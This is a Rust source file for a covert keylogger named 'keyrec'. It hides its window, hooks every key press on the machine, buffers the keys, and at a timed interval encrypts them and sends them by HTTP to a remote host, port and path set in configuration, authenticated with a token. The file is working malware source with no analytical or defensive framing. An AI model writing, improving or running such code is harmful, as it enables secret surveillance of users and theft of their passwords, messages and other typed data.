#![windows_subsystem = "windows"]

use iblib::{
  connection::create_stream,
  constant::*,
  debug,
  util::{encrypt, setup, Result},
};
use once_cell::sync::Lazy;
use rdev::{listen, Event, EventType};

use std::{
  process::exit,
  sync::{Arc, Mutex},
  thread,
  time::Duration,
};

pub const NAME: &str = "keyrec";
pub const KEYS_SAVE_INTERVAL_IN_MS: &str = env!("KEYS_SAVE_INTERVAL_IN_MS");

// TODO: implement without static
pub static TYPED_KEYS: Lazy<Arc<Mutex<Vec<String>>>> = Lazy::new(|| Arc::new(Mutex::new(vec![])));

fn main() {
  let keys_save_interval = Duration::from_millis(KEYS_SAVE_INTERVAL_IN_MS.parse::<u64>().unwrap());

  match setup(&NAME) {
    Ok(_) => {}
    Err(err) => {
      debug!("Unable to setup - {:?}.", err);
      exit(0);
    }
  }

  let keys = Arc::clone(&TYPED_KEYS);
  thread::spawn(move || loop {
    thread::sleep(keys_save_interval);

    let mut keys = keys.lock().unwrap();
    let keys_cloned = keys.clone();
    keys.clear();

    match save(keys_cloned) {
      Ok(_) => {}
      Err(err) => {
        debug!("Unable to save keys - {:?}.", err);
      }
    }
  });

  if let Err(err) = listen(callback) {
    debug!("Unable to listen - {:?}.", err);
  }
}

fn save(keys: Vec<String>) -> Result<()> {
  debug!("Saving keys with len - {}...", keys.len());

  if keys.is_empty() {
    debug!("Skip saving.");
    return Ok(());
  }

  let body = format!("{{\"keys\": {:?} }}", keys);
  let body = encrypt(&body);

  let headers = format!(
    "{method} {path} HTTP/1.1{crlf}Host: {host}:{port}{crlf}Accept: */*{crlf}Content-type: text/plain{crlf}Content-length: {content_length}{crlf}x-client-token: {token}{body_separator}",
    method = CONF_METHOD,
    path = CONF_PATH,
    crlf = CRLF,
    host = CONF_HOST,
    port = CONF_PORT,
    body_separator = BODY_SEPARATOR,
    token = *TOKEN,
    content_length = body.len(),
  );

  let mut stream = create_stream(
    CONF_SSL.parse().unwrap(),
    CONF_HOST,
    CONF_PORT.parse().unwrap(),
  )?;

  stream.write_buf(headers.as_bytes())?;
  stream.write_buf(body.as_bytes())?;

  debug!("Done saving keys with len - {}.", keys.len());

  Ok(())
}

fn callback(event: Event) {
  match event.event_type {
    EventType::KeyPress(key) => {
      debug!("KeyPress:\"{:?}\" fired.", key);
      let mut keys = TYPED_KEYS.lock().unwrap();
      keys.push(format!("{:?}", key));
    }
    _ => (),
  }
}
